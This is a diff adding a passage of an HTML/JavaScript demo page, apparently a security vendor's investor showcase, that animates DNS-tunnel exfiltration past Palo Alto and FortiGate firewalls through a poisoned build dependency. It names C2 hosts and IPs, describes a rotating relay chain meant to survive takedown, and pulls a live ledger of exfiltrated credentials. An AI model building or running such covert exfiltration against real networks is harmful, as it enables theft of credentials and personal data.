@@ -1,0 +1,1258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>ApexAegis — Live Demo: Two-Tier NGFW Bypass & Supply Chain Exfiltration</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Outfit:wght@500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg-dark: #0a0e1a;
+      --panel-bg: rgba(26, 34, 54, 0.95);
+      --panel-border: #2a3550;
+      --accent-cyan: #9b7fff;
+      --accent-blue: #60a5fa;
+      --accent-orange: #fbbf24;
+      --accent-green: #86efac;
+      --accent-red: #ff6b6b;
+      --accent-yellow: #fbbf24;
+      --text-main: #ffffff;
+      --text-muted: #9ca3af;
+      --brand: #6D4AFF;
+      --brand-light: #9b7fff;
+      --brand-gradient: linear-gradient(90deg, #7c5cff, #9d7bff);
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+
+    .title-area h1, .tab-btn, .tier-title, .panel-header, .brand-chip, .investor-banner strong {
+      font-family: 'Outfit', 'Inter', sans-serif;
+    }
+
+    .brand-chip {
+      font-size: 0.72rem; font-weight: 600; letter-spacing: 0.4px;
+      color: #e7e3ff; background: rgba(109, 74, 255, 0.15);
+      border: 1px solid rgba(155, 127, 255, 0.5); padding: 5px 12px;
+      border-radius: 999px; white-space: nowrap;
+    }
+
+    body {
+      background-color: var(--bg-dark);
+      color: var(--text-main);
+      padding: 16px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      min-width: 1250px;
+    }
+
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 14px 22px;
+      background: var(--panel-bg);
+      border: 1px solid var(--panel-border);
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+    }
+
+    .title-area { display: flex; align-items: center; gap: 14px; }
+
+    .badge-live {
+      width: 10px; height: 10px; background: var(--accent-red);
+      border-radius: 50%; box-shadow: 0 0 10px var(--accent-red);
+      animation: pulse 1.5s infinite;
+    }
+
+    .title-area h1 { font-size: 1.1rem; letter-spacing: 0.5px; font-weight: 700; }
+    .controls { display: flex; gap: 8px; }
+
+    .view-tabs {
+      display: flex; gap: 6px; background: #1a2236; padding: 4px;
+      border-radius: 8px; border: 1px solid #2a3550;
+    }
+
+    .tab-btn {
+      background: transparent; border: none; color: var(--text-muted);
+      padding: 6px 14px; border-radius: 6px; font-size: 0.78rem;
+      font-weight: 600; cursor: pointer; transition: all 0.2s ease;
+    }
+
+    .tab-btn.active {
+      background: var(--brand); color: #fff;
+      box-shadow: 0 0 8px rgba(109, 74, 255, 0.45);
+    }
+
+    button.nav-btn {
+      background: #1a2236; color: var(--text-main); border: 1px solid #2a3550;
+      padding: 6px 14px; border-radius: 6px; font-size: 0.8rem;
+      cursor: pointer; font-weight: 600;
+    }
+
+    button.nav-btn:hover { background: #2a3550; border-color: var(--brand-light); }
+    button.primary { background: var(--brand-gradient); border: none; color: #fff; }
+
+    /* Breach banner (baseline vs pivot) */
+    .investor-banner {
+      border-radius: 8px; padding: 10px 16px; font-size: 0.8rem;
+      display: flex; justify-content: space-between; align-items: center;
+      transition: all 0.3s ease;
+    }
+
+    .investor-banner.state-baseline {
+      background: linear-gradient(90deg, rgba(134, 239, 172, 0.10), rgba(96, 165, 250, 0.06));
+      border: 1px solid rgba(134, 239, 172, 0.35);
+    }
+    .investor-banner.state-baseline strong { color: var(--accent-green); }
+
+    .investor-banner.state-breach {
+      background: linear-gradient(90deg, rgba(255, 107, 107, 0.16), rgba(251, 191, 36, 0.10));
+      border: 1px solid rgba(255, 107, 107, 0.45);
+      animation: bannerGlitch 0.5s linear;
+    }
+    .investor-banner.state-breach strong { color: var(--accent-red); }
+
+    @keyframes bannerGlitch {
+      0% { transform: translate(0); filter: none; }
+      20% { transform: translate(-3px, 1px); filter: hue-rotate(25deg); }
+      40% { transform: translate(3px, -1px); }
+      60% { transform: translate(-2px, 0); filter: saturate(2); }
+      80% { transform: translate(2px, 1px); }
+      100% { transform: translate(0); filter: none; }
+    }
+
+    #activeModeLabel { color: var(--accent-cyan); font-weight: 600; }
+    .state-breach #activeModeLabel { color: var(--accent-red); }
+    .state-baseline #activeModeLabel { color: var(--accent-green); }
+
+    .topology-panel {
+      position: relative; background: #0a0e1a; border: 1px solid var(--panel-border);
+      border-radius: 10px; height: 400px; overflow: hidden;
+    }
+
+    svg.network-canvas { width: 100%; height: 100%; }
+
+    .packet-pill {
+      position: absolute; width: 14px; height: 14px; border-radius: 50%;
+      background: radial-gradient(circle, var(--brand-light) 30%, #7c5cff 100%);
+      box-shadow: 0 0 15px var(--brand-light), 0 0 25px rgba(124, 92, 255, 0.8);
+      transform: translate(-50%, -50%); pointer-events: none; z-index: 99;
+      display: none;
+      transition: left 0.7s cubic-bezier(0.4, 0, 0.2, 1), top 0.7s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    /* ambient regular-traffic pills (scene 1) */
+    .packet-pill.ambient { transition: none; width: 10px; height: 10px; z-index: 98; }
+    .packet-pill.pkt-out {
+      background: radial-gradient(circle, #9b7fff 30%, #7c5cff 100%);
+      box-shadow: 0 0 12px rgba(155, 127, 255, 0.9);
+    }
+    .packet-pill.pkt-in {
+      background: radial-gradient(circle, #60a5fa 30%, #3b82f6 100%);
+      box-shadow: 0 0 12px rgba(96, 165, 250, 0.9);
+    }
+    .packet-pill.pkt-breach {
+      background: radial-gradient(circle, #ff6b6b 30%, #ff8f8f 100%);
+      box-shadow: 0 0 15px #ff6b6b, 0 0 25px rgba(255, 107, 107, 0.8);
+    }
+
+    /* topology modes: neutral destinations first, hostile C2 reveal on pivot */
+    #advZone, #target1Box, #target2Box { transition: stroke 0.5s ease, fill 0.5s ease; }
+    svg.mode-normal #advZone { stroke: #60a5fa; fill: #101828; }
+    svg.mode-normal #target1Box, svg.mode-normal #target2Box { stroke: #60a5fa; fill: #1a2236; }
+    svg.mode-normal .t-title { fill: #e7e3ff; }
+    svg.mode-normal .t-ip { fill: #60a5fa; }
+    svg.mode-normal .t-desc { fill: #9ca3af; }
+    svg.mode-normal #zoneLabel { fill: #9ca3af; }
+    svg.mode-hostile #advZone { stroke: #ff6b6b; fill: rgba(255, 107, 107, 0.05); animation: zonePulse 2s ease-in-out infinite; }
+    svg.mode-hostile #target1Box, svg.mode-hostile #target2Box { stroke: #ff6b6b; fill: #24111d; }
+    svg.mode-hostile .t-title { fill: #fecdd3; }
+    svg.mode-hostile .t-ip { fill: #ff6b6b; }
+    svg.mode-hostile .t-desc { fill: #fda4af; }
+    svg.mode-hostile #zoneLabel { fill: #fda4af; }
+    @keyframes zonePulse {
+      0%, 100% { filter: none; }
+      50% { filter: drop-shadow(0 0 6px rgba(255, 107, 107, 0.7)); }
+    }
+    svg.reveal #advZone, svg.reveal #target1Box, svg.reveal #target2Box {
+      animation: revealFlash 0.8s ease-out;
+    }
+    @keyframes revealFlash {
+      0% { stroke-width: 1; opacity: 0.35; }
+      40% { stroke-width: 4; opacity: 1; }
+      100% { stroke-width: 1.5; opacity: 1; }
+    }
+
+    .dpi-matrix-container { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+
+    .tier-box {
+      background: var(--panel-bg); border: 1px solid var(--panel-border);
+      border-radius: 8px; padding: 10px 12px;
+    }
+
+    .tier-title {
+      font-size: 0.76rem; font-weight: 700; letter-spacing: 0.5px;
+      margin-bottom: 8px; display: flex; justify-content: space-between;
+    }
+
+    .tier-title.palo { color: var(--accent-orange); }
+    .tier-title.forti { color: #ff6b6b; }
+
+    .profiles-grid { display: grid; grid-template-columns: repeat(6, 1fr); gap: 6px; }
+
+    .profile-card {
+      background: #1a2236; border: 1px solid #2a3550; border-radius: 6px;
+      padding: 6px 4px; text-align: center; transition: all 0.3s;
+    }
+
+    .profile-card h5 {
+      font-size: 0.64rem; color: var(--text-muted); margin-bottom: 4px;
+      text-transform: uppercase;
+    }
+
+    .status-badge {
+      font-size: 0.65rem; font-weight: 700; padding: 2px 5px; border-radius: 3px;
+      background: #2a3550; display: inline-block; color: #9ca3af;
+    }
+
+    .profile-card.inspecting { border-color: var(--accent-yellow); box-shadow: 0 0 8px rgba(251, 191, 36, 0.3); }
+    .profile-card.inspecting .status-badge { color: var(--accent-yellow); background: rgba(251, 191, 36, 0.15); }
+
+    .profile-card.evaded { border-color: var(--accent-red); background: rgba(255, 107, 107, 0.08); }
+    .profile-card.evaded .status-badge { color: var(--accent-red); background: rgba(255, 107, 107, 0.2); }
+
+    .profile-card.skipped { border-color: #2a3550; opacity: 0.6; }
+
+    /* Live loot / posture / zero-day panels */
+    .loot-grid { display: grid; grid-template-columns: 1.35fr 1fr 1fr; gap: 12px; }
+
+    .panel {
+      background: var(--panel-bg); border: 1px solid var(--panel-border);
+      border-radius: 10px; padding: 12px 14px; height: 258px;
+      display: flex; flex-direction: column;
+    }
+
+    .panel-header {
+      font-size: 0.8rem; font-weight: 700; color: var(--accent-cyan);
+      margin-bottom: 8px; display: flex; justify-content: space-between;
+      border-bottom: 1px solid var(--panel-border); padding-bottom: 6px;
+    }
+
+    .panel-body { overflow-y: auto; flex-grow: 1; font-size: 0.74rem; line-height: 1.5; }
+
+    .hero-stats { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 8px; }
+
+    .stat-chip {
+      background: #1a2236; border: 1px solid #2a3550; border-radius: 6px;
+      padding: 5px 9px; text-align: center; min-width: 74px;
+    }
+    .stat-chip b { display: block; font-size: 1rem; color: var(--accent-cyan); }
+    .stat-chip span { font-size: 0.6rem; color: var(--text-muted); text-transform: uppercase; }
+    .stat-chip.hot b { color: var(--accent-red); }
+
+    .ledger-row {
+      display: flex; gap: 8px; align-items: baseline; padding: 4px 6px;
+      border-left: 3px solid #2a3550; margin-bottom: 5px; background: #1a2236;
+      border-radius: 0 4px 4px 0;
+    }
+    .ledger-row .cls { color: #e7e3ff; font-weight: 600; font-size: 0.72rem; }
+    .ledger-row .why { color: var(--text-muted); font-size: 0.66rem; display: block; }
+    .ledger-row .expo { color: var(--accent-yellow); font-size: 0.64rem; margin-left: auto; text-align: right; white-space: nowrap; }
+    .ledger-row.observed { border-left-color: var(--accent-red); background: rgba(255, 107, 107, 0.07); }
+    .tag-obs { color: var(--accent-red); font-size: 0.58rem; font-weight: 700; }
+    .tag-cap { color: #4b5563; font-size: 0.58rem; font-weight: 700; }
+
+    .check-grid { display: flex; flex-wrap: wrap; gap: 6px; }
+
+    .check-chip {
+      background: #1a2236; border: 1px solid #2a3550; border-radius: 6px;
+      padding: 5px 8px; font-size: 0.66rem; max-width: 100%;
+    }
+    .check-chip b { display: block; font-size: 0.7rem; }
+    .check-chip i { font-style: normal; color: var(--text-muted); font-size: 0.6rem; }
+    .check-chip.ok { border-color: rgba(134, 239, 172, 0.5); }
+    .check-chip.ok b { color: var(--accent-green); }
+    .check-chip.bad { border-color: rgba(255, 107, 107, 0.6); background: rgba(255, 107, 107, 0.07); }
+    .check-chip.bad b { color: var(--accent-red); }
+    .check-chip.na b { color: var(--text-muted); }
+
+    .posture-verdict {
+      margin-top: 8px; padding: 6px 8px; border-radius: 6px; font-size: 0.7rem;
+      font-weight: 700; text-align: center;
+      background: rgba(134, 239, 172, 0.12); border: 1px solid rgba(134, 239, 172, 0.4);
+      color: var(--accent-green);
+    }
+
+    .cve-row {
+      display: flex; gap: 8px; align-items: center; padding: 5px 7px;
+      background: #1a2236; border: 1px solid #2a3550; border-radius: 6px;
+      margin-bottom: 5px;
+    }
+    .cve-row .cve-id { color: #fbbf24; font-weight: 700; font-size: 0.66rem; white-space: nowrap; }
+    .cve-row .cve-name { color: var(--text-muted); font-size: 0.64rem; flex-grow: 1; }
+    .cve-row .gate { font-size: 0.6rem; font-weight: 700; padding: 2px 6px; border-radius: 3px; white-space: nowrap; }
+    .gate.open { color: var(--accent-yellow); background: rgba(251, 191, 36, 0.15); border: 1px solid rgba(251, 191, 36, 0.4); }
+    .gate.closed { color: var(--accent-green); background: rgba(134, 239, 172, 0.12); border: 1px solid rgba(134, 239, 172, 0.4); }
+    .cve-row .exploit { color: var(--accent-red); font-size: 0.6rem; font-weight: 700; }
+
+    .cve-facts { font-size: 0.64rem; color: var(--text-muted); margin-top: 6px; word-break: break-all; }
+    .cve-thesis {
+      margin-top: 6px; padding: 6px 8px; font-size: 0.68rem; border-radius: 6px;
+      background: rgba(96, 165, 250, 0.08); border: 1px solid rgba(96, 165, 250, 0.3);
+      color: #e7e3ff;
+    }
+
+    .pending { color: var(--text-muted); font-style: italic; padding: 10px 4px; }
+
+    /* multi-server covert chain strip */
+    .chain-panel { height: auto; }
+    .chain-track { display: flex; align-items: center; padding: 6px 0 4px; }
+    .chain-node {
+      background: #1a2236; border: 1px solid #2a3550; border-radius: 8px;
+      padding: 7px 14px; text-align: center; min-width: 148px;
+    }
+    .chain-node b { display: block; font-size: 0.74rem; color: #e7e3ff; font-family: 'Outfit', 'Inter', sans-serif; }
+    .chain-node i { font-style: normal; font-size: 0.6rem; color: #9ca3af; }
+    .chain-node.hop { border-color: rgba(96, 165, 250, 0.55); }
+    .chain-node.hop b { color: #60a5fa; }
+    .chain-node.chain-dest { background: rgba(109, 74, 255, 0.14); border-color: rgba(155, 127, 255, 0.6); }
+    .chain-node.chain-dest b { color: #9b7fff; }
+    .chain-link { position: relative; flex: 1; min-width: 42px; height: 2px; background: #ffffff; opacity: 0.55; }
+    .chain-dot {
+      position: absolute; top: 50%; left: -5px; width: 9px; height: 9px;
+      border-radius: 50%; transform: translateY(-50%);
+      background: radial-gradient(circle, #9b7fff 30%, #7c5cff 100%);
+      box-shadow: 0 0 8px #9b7fff;
+      animation: chainFlow 2.1s linear infinite;
+    }
+    .chain-link:nth-child(4) .chain-dot { animation-delay: 0.52s; }
+    .chain-link:nth-child(6) .chain-dot { animation-delay: 1.04s; }
+    .chain-link:nth-child(8) .chain-dot { animation-delay: 1.56s; }
+    @keyframes chainFlow { from { left: -5px; } to { left: calc(100% + 5px); } }
+    .chain-note { font-size: 0.68rem; color: #9ca3af; line-height: 1.45; margin-top: 4px; }
+    .chain-note strong { color: #e7e3ff; }
+
+    .bottom-grid { display: grid; grid-template-columns: 1.15fr 0.85fr; gap: 12px; }
+
+    .terminal-body {
+      background: #0a0e1a; border: 1px solid #2a3550; border-radius: 6px;
+      padding: 10px; font-size: 0.72rem; color: #60a5fa; overflow-y: auto;
+      flex-grow: 1; line-height: 1.45; white-space: pre-wrap;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    }
+
+    .analysis-body { font-size: 0.78rem; color: var(--text-muted); line-height: 1.55; overflow-y: auto; }
+    .analysis-body code { background: #2a3550; color: #fbbf24; padding: 2px 4px; border-radius: 4px; font-size: 0.74rem; }
+    .analysis-body strong { color: #e7e3ff; }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.4; transform: scale(1.15); }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="title-area">
+      <span class="badge-live"></span>
+      <h1>ApexAegis — Enterprise Defense Evasion: Two-Tier NGFW DPI &amp; Supply Chain Compromise</h1>
+      <span class="brand-chip">demo.apexaegis.app:8443</span>
+    </div>
+    <div class="view-tabs">
+      <button class="tab-btn active" id="tabDiagram1" onclick="switchDiagram(1)">Diagram 1: Double-DPI Standard</button>
+      <button class="tab-btn" id="tabDiagram2" onclick="switchDiagram(2)">Diagram 2: Zero-Day Pivot</button>
+      <button class="tab-btn" id="tabDiagram3" onclick="switchDiagram(3)">Diagram 3: Covert Exfil</button>
+    </div>
+    <div class="controls">
+      <button id="btnPlay" class="nav-btn primary" onclick="togglePlay()">▶ Run Sequence</button>
+      <button id="btnStep" class="nav-btn" onclick="stepForward()">⏭ Step</button>
+      <button id="btnReset" class="nav-btn" onclick="resetSim()">↺ Reset</button>
+    </div>
+  </header>
+
+  <div class="investor-banner state-baseline" id="investorBanner">
+    <div><strong>Executive Thesis:</strong> "Defense-in-depth" with two enterprise firewalls (Palo Alto Tier 1 + FortiGate Tier 2) remains blind to TCP-over-DNS covert proxies launched by poisoned build dependencies — the data leaves without a single kernel exploit firing.</div>
+    <div id="activeModeLabel">MODE: ARCHITECTURAL BASELINE</div>
+  </div>
+
+  <div class="topology-panel">
+    <div id="packet" class="packet-pill"></div>
+
+    <svg class="network-canvas mode-normal" viewBox="0 0 1280 400">
+      <rect x="520" y="15" width="740" height="370" rx="10" fill="none" stroke="#2a3550" stroke-dasharray="6"/>
+      <text x="540" y="38" fill="#9ca3af" font-size="12" font-weight="bold">Multi-VPC Inspection Topology</text>
+
+      <rect x="980" y="55" width="265" height="315" rx="8" fill="#1a2236" stroke="#2a3550" stroke-width="1.5"/>
+      <text x="995" y="80" fill="#60a5fa" font-size="11" font-weight="bold">Trusted VPC</text>
+      <text x="995" y="96" fill="#6b7280" font-size="9">Least-Privilege Subnet (10.10.100.0/24)</text>
+
+      <rect x="760" y="55" width="205" height="315" rx="8" fill="#1f2a40" stroke="#ea580c" stroke-width="1.5"/>
+      <text x="775" y="80" fill="#fbbf24" font-size="11" font-weight="bold">Inspection VPC</text>
+      <text x="775" y="96" fill="#9ca3af" font-size="9">Tier 1: Palo Alto NGFW</text>
+      <text x="775" y="110" fill="#6b7280" font-size="9">MGMT: 136.85.16.128</text>
+
+      <rect x="540" y="55" width="205" height="315" rx="8" fill="#1f2a40" stroke="#dc2626" stroke-width="1.5"/>
+      <text x="555" y="80" fill="#ff6b6b" font-size="11" font-weight="bold">Untrusted Inspection VPC</text>
+      <text x="555" y="96" fill="#9ca3af" font-size="9">Tier 2: FortiGate NGFW</text>
+      <text x="555" y="110" fill="#6b7280" font-size="9">WAN Port1: 34.124.160.193</text>
+
+      <g transform="translate(470, 195)">
+        <circle cx="20" cy="20" r="24" fill="#1a2236" stroke="#60a5fa" stroke-width="1.5"/>
+        <text x="20" y="24" text-anchor="middle" fill="#60a5fa" font-size="9" font-weight="bold">IGW</text>
+      </g>
+
+      <g transform="translate(340, 180)">
+        <ellipse cx="45" cy="35" rx="45" ry="25" fill="#1a2236" stroke="#4b5563"/>
+        <text x="45" y="39" text-anchor="middle" fill="#e7e3ff" font-size="11" font-weight="bold">Internet</text>
+      </g>
+
+      <rect id="advZone" x="20" y="55" width="270" height="315" rx="8" fill="#101828" stroke="#ff6b6b" stroke-width="1.5"/>
+      <text x="35" y="80" fill="#fda4af" font-size="11" font-weight="bold" id="zoneLabel">Public Internet Edge</text>
+
+      <g transform="translate(1010, 120)">
+        <rect width="130" height="75" rx="6" fill="#1a2236" stroke="#7c5cff" stroke-width="1.5"/>
+        <text x="65" y="22" text-anchor="middle" fill="#ffffff" font-size="10" font-weight="bold">DevOps Linux</text>
+        <text x="65" y="38" text-anchor="middle" fill="#60a5fa" font-size="9">10.10.100.100</text>
+        <text x="65" y="54" text-anchor="middle" fill="#9ca3af" font-size="8">Least-Privilege User</text>
+        <text x="65" y="67" text-anchor="middle" fill="#86efac" font-size="8" id="nodeClientRole">Role: Dev Environment</text>
+      </g>
+
+      <g transform="translate(1010, 240)">
+        <rect width="130" height="70" rx="6" fill="#1a2236" stroke="#2a3550"/>
+        <text x="65" y="24" text-anchor="middle" fill="#9ca3af" font-size="10">Corporate Windows</text>
+        <text x="65" y="42" text-anchor="middle" fill="#6b7280" font-size="9">10.10.100.200</text>
+        <text x="65" y="58" text-anchor="middle" fill="#4b5563" font-size="8">Standard Desktop</text>
+      </g>
+
+      <g transform="translate(810, 160)">
+        <polygon points="45,0 90,22 90,68 45,90 0,68 0,22" fill="#1c1924" stroke="#ea580c" stroke-width="2"/>
+        <text x="45" y="42" text-anchor="middle" fill="#ffffff" font-size="10" font-weight="bold">Palo Alto</text>
+        <text x="45" y="56" text-anchor="middle" fill="#fbbf24" font-size="8">eth1/2: 10.10.100.2</text>
+        <text x="45" y="68" text-anchor="middle" fill="#fbbf24" font-size="8">eth1/1: 10.10.10.3</text>
+      </g>
+
+      <g transform="translate(590, 160)">
+        <polygon points="45,0 90,22 90,68 45,90 0,68 0,22" fill="#241417" stroke="#dc2626" stroke-width="2"/>
+        <text x="45" y="42" text-anchor="middle" fill="#ffffff" font-size="10" font-weight="bold">FortiGate</text>
+        <text x="45" y="56" text-anchor="middle" fill="#ff6b6b" font-size="8">port2: 10.10.10.2</text>
+        <text x="45" y="68" text-anchor="middle" fill="#ff6b6b" font-size="8">port1: 34.124.160.193</text>
+      </g>
+
+      <g transform="translate(40, 115)">
+        <rect id="target1Box" width="230" height="70" rx="6" fill="#24111d" stroke="#ff6b6b" stroke-width="1.5"/>
+        <text x="115" y="24" text-anchor="middle" fill="#fecdd3" font-size="10" font-weight="bold" id="target1Name" class="t-title">dns.apexadversary.com</text>
+        <text x="115" y="42" text-anchor="middle" fill="#ff6b6b" font-size="9" id="target1IP" class="t-ip">34.180.91.216 (DNS C2)</text>
+        <text x="115" y="58" text-anchor="middle" fill="#fda4af" font-size="8" id="target1Desc" class="t-desc">dnscat2 / Exfiltration Sink</text>
+      </g>
+
+      <g transform="translate(40, 235)">
+        <rect id="target2Box" width="230" height="70" rx="6" fill="#24111d" stroke="#ff6b6b" stroke-width="1.5"/>
+        <text x="115" y="24" text-anchor="middle" fill="#fecdd3" font-size="10" font-weight="bold" id="target2Name" class="t-title">dns1.apexadversary.com</text>
+        <text x="115" y="42" text-anchor="middle" fill="#ff6b6b" font-size="9" id="target2IP" class="t-ip">34.146.249.74 (UDP/TCP 53)</text>
+        <text x="115" y="58" text-anchor="middle" fill="#fda4af" font-size="8" id="target2Desc" class="t-desc">TCP-over-DNS Covert Proxy</text>
+      </g>
+
+      <line x1="1010" y1="160" x2="899" y2="195" stroke="#ffffff" stroke-width="2"/>
+      <line x1="810" y1="205" x2="680" y2="205" stroke="#ffffff" stroke-width="2"/>
+      <line x1="590" y1="205" x2="513" y2="215" stroke="#ffffff" stroke-width="2"/>
+      <line x1="470" y1="215" x2="428" y2="215" stroke="#ffffff" stroke-width="2"/>
+      <line x1="340" y1="215" x2="270" y2="150" stroke="#ffffff" stroke-width="2"/>
+      <line x1="340" y1="215" x2="270" y2="270" stroke="#ffffff" stroke-width="2"/>
+      <line x1="1010" y1="275" x2="900" y2="228" stroke="#ffffff" stroke-width="2"/>
+    </svg>
+  </div>
+
+  <div class="dpi-matrix-container">
+    <div class="tier-box">
+      <div class="tier-title palo">
+        <span>TIER 1: PALO ALTO NETWORKS NGFW (PAN-OS SP3) — DOUBLE-DPI STANDARD, PASS 1 OF 2</span>
+        <span id="tier1StatusBadge">SCANNED</span>
+      </div>
+      <div class="profiles-grid">
+        <div class="profile-card" id="pa-av"><h5>Antivirus</h5><span class="status-badge" id="b-pa-av">SCANNED</span></div>
+        <div class="profile-card" id="pa-spyware"><h5>Anti-Spyware</h5><span class="status-badge" id="b-pa-spyware">SCANNED</span></div>
+        <div class="profile-card" id="pa-vuln"><h5>Vulnerability</h5><span class="status-badge" id="b-pa-vuln">SCANNED</span></div>
+        <div class="profile-card" id="pa-url"><h5>URL Filtering</h5><span class="status-badge" id="b-pa-url">SCANNED</span></div>
+        <div class="profile-card" id="pa-file"><h5>File Blocking</h5><span class="status-badge" id="b-pa-file">SCANNED</span></div>
+        <div class="profile-card" id="pa-wf"><h5>WildFire</h5><span class="status-badge" id="b-pa-wf">SCANNED</span></div>
+      </div>
+    </div>
+
+    <div class="tier-box">
+      <div class="tier-title forti">
+        <span>TIER 2: FORTIGATE NGFW (FLOW / PROXY DPI) — DOUBLE-DPI STANDARD, PASS 2 OF 2</span>
+        <span id="tier2StatusBadge">SCANNED</span>
+      </div>
+      <div class="profiles-grid">
+        <div class="profile-card" id="fg-ssl"><h5>SSL Decrypt</h5><span class="status-badge" id="b-fg-ssl">SCANNED</span></div>
+        <div class="profile-card" id="fg-dns"><h5>DNS Filter</h5><span class="status-badge" id="b-fg-dns">SCANNED</span></div>
+        <div class="profile-card" id="fg-app"><h5>App Control</h5><span class="status-badge" id="b-fg-app">SCANNED</span></div>
+        <div class="profile-card" id="fg-ips"><h5>IPS Engine</h5><span class="status-badge" id="b-fg-ips">SCANNED</span></div>
+        <div class="profile-card" id="fg-web"><h5>Web Filter</h5><span class="status-badge" id="b-fg-web">SCANNED</span></div>
+        <div class="profile-card" id="fg-av"><h5>FortiGuard AV</h5><span class="status-badge" id="b-fg-av">SCANNED</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- LIVE: exfiltrated asset ledger | machine posture | zero-day chain -->
+  <div class="loot-grid">
+    <div class="panel">
+      <div class="panel-header">
+        <span>EXFILTRATED ASSET LEDGER — BREACH IMPACT</span>
+        <span style="color:var(--accent-red);" id="ledgerStatus">LIVE</span>
+      </div>
+      <div class="panel-body" id="ledgerBody"><div class="pending">loading live record…</div></div>
+    </div>
+
+    <div class="panel">
+      <div class="panel-header">
+        <span>TARGET POSTURE — LEAST PRIVILEGE</span>
+        <span style="color:var(--accent-green);" id="postureStatus">VERIFYING</span>
+      </div>
+      <div class="panel-body" id="postureBody"><div class="pending">loading live record…</div></div>
+    </div>
+
+    <div class="panel">
+      <div class="panel-header">
+        <span>ZERO-DAY CHAIN — CVE GATE ASSESSMENT</span>
+        <span style="color:var(--accent-yellow);" id="cveStatus">RECON ONLY</span>
+      </div>
+      <div class="panel-body" id="cveBody"><div class="pending">loading live record…</div></div>
+    </div>
+  </div>
+
+  <!-- multi-server chaining highlight -->
+  <div class="panel chain-panel">
+    <div class="panel-header">
+      <span>COVERT CHANNEL — CHAINED MULTI-SERVER TCP-over-DNS RELAY</span>
+      <span style="color:var(--accent-green);" id="chainStatus">3 RELAYS ACTIVE · ROTATES PER SESSION</span>
+    </div>
+    <div class="chain-track">
+      <div class="chain-node"><b>DevOps host</b><i>10.10.100.100 (least-priv)</i></div>
+      <div class="chain-link"><span class="chain-dot"></span></div>
+      <div class="chain-node hop"><b>relay-1 · dns1</b><i>UDP/53 · VPS A</i></div>
+      <div class="chain-link"><span class="chain-dot"></span></div>
+      <div class="chain-node hop"><b>relay-2</b><i>DoH/443 · VPS B</i></div>
+      <div class="chain-link"><span class="chain-dot"></span></div>
+      <div class="chain-node hop"><b>relay-3</b><i>UDP/53 · VPS C</i></div>
+      <div class="chain-link"><span class="chain-dot"></span></div>
+      <div class="chain-node chain-dest"><b>demo.apexaegis.app:8443</b><i>exfil ingest · investor dashboard</i></div>
+    </div>
+    <div class="chain-note"><strong>The channel is not one tunnel — it is a chain of servers.</strong> Each hop only knows its neighbour: DNS frames are re-terminated and re-forwarded (UDP/53 ↔ DoH/443 fallback per hop), so seizing or fingerprinting any single relay maps neither the client nor the final sink. Chain order rotates per session; killing any one VPS re-routes, it does not kill the channel.</div>
+  </div>
+
+  <div class="bottom-grid">
+    <div class="panel">
+      <div class="panel-header">
+        <span>LIVE HOST AUDIT &amp; PROCESS LOG (10.10.100.100)</span>
+        <span style="color:var(--accent-green);" id="termStatus">READY</span>
+      </div>
+      <div class="terminal-body" id="termLog">Select a scenario above to view packet tracing and DPI validation logs...</div>
+    </div>
+
+    <div class="panel">
+      <div class="panel-header">
+        <span>EXECUTIVE DEFENSE AUDIT &amp; ARCHITECTURE BREAKDOWN</span>
+        <span style="color:var(--accent-yellow);" id="auditStatus">IDLE</span>
+      </div>
+      <div class="analysis-body" id="analysisText">
+        Select a diagram to review the multi-tier inspection mechanics.
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ---------------- live telemetry ----------------
+    const FALLBACK = {
+      target: 'debian-builder', user: 'arjun.das', ts: '—',
+      credsTotal: 26, sensEnv: 23, envTotal: 53, fileCount: 5, datasetCount: 2,
+      bytes: 7848, posture: null, primitives: null, files: [], datasets: [], creds: []
+    };
+    let LIVE = null;
+    let lastBytesShown = 0;
+
+    function d() { return LIVE || FALLBACK; }
+
+    function fmtBytes(n) {
+      if (n >= 1048576) return (n / 1048576).toFixed(1) + ' MB';
+      if (n >= 1024) return (n / 1024).toFixed(1) + ' KB';
+      return n + ' B';
+    }
+
+    function credKindList(r) {
+      return (r.creds || []).map(c => String(c.kind || '')).filter(Boolean);
+    }
+
+    async function refreshLive() {
+      try {
+        const res = await fetch('/api/records', { cache: 'no-store' });
+        const recs = await res.json();
+        if (!Array.isArray(recs) || !recs.length) return;
+        const r = recs[recs.length - 1];
+        const kinds = credKindList(r);
+        const sensEnv = kinds.filter(k => k.indexOf('env:') === 0).length;
+        LIVE = {
+          target: r.target || '?', user: r.user || '?', ts: r.ts || '—',
+          credsTotal: (r.creds || []).length, sensEnv,
+          envTotal: (r.env || []).length, fileCount: (r.files || []).length,
+          datasetCount: (r.datasets || []).length,
+          bytes: recs.reduce((s, x) => s + JSON.stringify(x).length, 0),
+          posture: r.posture || null, primitives: r.primitives || null,
+          files: r.files || [], datasets: r.datasets || [], creds: r.creds || [],
+          records: recs.length
+        };
+        renderLedger(); renderPosture(); renderCves(); updateBanner(false);
+        if (!isPlaying && currentStep === 0) switchDiagram(currentDiagram);
+      } catch (e) { /* offline / file:// — keep fallback */ }
+    }
+
+    // ---------------- ledger (breach value showcase) ----------------
+    const LEDGER_ROWS = [
+      {
+        cls: 'Consumer credit & loan files', pats: /credit|loan|bureau/i,
+        why: 'consumer financial records — PDPA class',
+        expo: 'PDPA: up to S$1M or 10% turnover',
+        adv: 'competitor: risk-based pricing pre-emption'
+      },
+      {
